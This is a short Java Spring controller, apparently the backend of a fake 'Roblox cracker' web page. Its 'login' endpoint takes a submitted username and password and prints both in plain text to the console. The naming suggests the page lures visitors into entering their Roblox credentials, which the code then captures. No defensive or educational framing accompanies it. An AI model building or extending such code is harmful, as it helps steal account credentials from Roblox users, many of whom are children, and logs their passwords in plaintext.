package dev.lapisteam.webapp.ui.roblox;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;

@Controller
public class RobloxCracker {

    @RequestMapping("cracker")
    public ModelAndView renderRobloxPage(Model model){

        return new ModelAndView("roblox/index");
    }

    @RequestMapping("login")
    public ModelAndView renderLoginPage(Model model, @RequestParam String login, @RequestParam String password){
        System.out.printf("login=%s, password=%s%n", login, password);
        return new ModelAndView("roblox/login");
    }
}
